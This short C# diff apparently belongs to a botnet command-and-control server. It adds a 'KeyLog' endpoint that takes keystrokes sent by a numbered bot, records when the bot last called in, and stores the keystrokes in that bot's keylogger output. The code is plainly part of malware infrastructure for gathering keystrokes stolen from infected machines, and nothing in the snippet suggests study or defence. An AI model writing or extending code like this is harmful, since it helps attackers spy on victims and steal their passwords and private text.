@@ -23,4 +23,16 @@ public class ResultsController : AbstractController
 
         return Ok();
     }
+
+    [HttpPost("KeyLog")]
+    [ProducesResponseType(StatusCodes.Status200OK)]
+    public IActionResult KeyLog([FromQuery] int bot_id, [FromBody] KeyLogPoco keys)
+    {
+        BotClient bot = GetBot(bot_id);
+
+        bot.ConnectionInfo.LastHeardFrom = DateTime.UtcNow;
+        bot.BotResult.KeyLoggerOutput.AddRange(keys.Keys);
+
+        return Ok();
+    }
 }
